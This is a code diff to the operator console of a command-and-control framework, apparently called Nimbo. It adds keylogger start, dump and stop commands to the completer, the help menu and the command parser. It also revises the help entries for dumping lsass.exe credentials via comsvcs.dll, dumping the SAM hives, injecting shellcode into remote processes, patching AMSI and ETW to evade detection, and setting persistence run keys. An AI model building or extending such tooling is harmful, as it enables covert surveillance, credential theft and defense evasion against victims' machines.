@@ -84,6 +84,11 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'clipboard': None,
     'screenshot': None,
     'audio': None,
+    'keylog': {
+        'start': None,
+        'dump': None,
+        'stop': None
+    },
     'patch': {
         'amsi': None,
         'etw': None
@@ -139,7 +144,7 @@ def exit_nimbo():
         try:
             with open(agents_file_path, "wt") as f:
                 json.dump(listener.agents, f)
-            utils.log_message(f"[*] Saved agent data")
+            utils.log_message(f"Saved agent data")
         except Exception:
             utils.log_message(f"[-] Could not save agent data")
 
@@ -192,16 +197,21 @@ def print_agent_help(os):
     --== Collection Stuff ==--
     clipboard                              ->  retrieve clipboard
     screenshot                             ->  retrieve screenshot
-    audio <record-time>                    ->  record audio 
+    audio <record-time>                    ->  record audio
+    keylog start                           ->  start keylogger
+    keylog dump                            ->  retrieve captured keystrokes
+    keylog stop                            ->  retrieve captured keystrokes and stop keylogger
     
     --== Post Exploitation Stuff ==--
-    lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
+    lsass direct                           ->  dump lsass.exe directly (elevation required)
+    lsass comsvcs                          ->  dump lsass.exe using rundll32 and comsvcs.dll (elevation required)
     sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
-    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process using indirect syscalls
+    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to a remote process using indirect syscalls
     assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single quoted string)
     
     --== Evasion Stuff ==--
-    patch <amsi/etw>                       ->  patch amsi/etw using indirect syscalls
+    patch amsi                             ->  patch amsi using indirect syscalls
+    patch etw                              ->  patch etw using indirect syscalls
     
     --== Persistence Stuff ==--
     persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
@@ -403,6 +413,13 @@ def agent_screen_windows(agent_id):
                     "assembly_args": assembly_args
                 }
 
+            elif re.fullmatch(r"\s*keylog\s+(start|dump|stop)\s*", command):
+                action = shlex.split(re.sub(r"\s*keylog\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "keylog",
+                    "action": action
+                }
+            
             elif re.fullmatch(r"\s*patch\s+(etw|amsi)\s*", command):
                 patch_func = shlex.split(re.sub(r"\s*patch\s+", "", command, 1))[0]
                 command_dict = {
@@ -625,7 +642,10 @@ def agent_screen_linux(agent_id):
 
 def send_build_command(build_params):
     build_command = "python3 builder/build.py " + build_params
-    subprocess.run(build_command, shell=True)
+    try:    
+        subprocess.run(build_command, shell=True)
+    except:
+        utils.log_message(f"[-] Stopping build", print_time=False)
 
 
 def main_screen():
@@ -712,13 +732,13 @@ if __name__ == '__main__':
             try:
                 with open(agents_file_path, "rt") as f:
                     listener.agents = json.load(f)
-                utils.log_message(f"[*] Loaded agent data")
+                utils.log_message(f"Loaded agent data")
             except Exception:
                 utils.log_message(f"[-] Could not load agent data")
         # handle listener starting
         if start_listener_on_start:
             listener.listener_start()
-            utils.log_message(f"[*] Listener started")
+            utils.log_message(f"Listener started")
         # go to main screen
         main_screen()
 
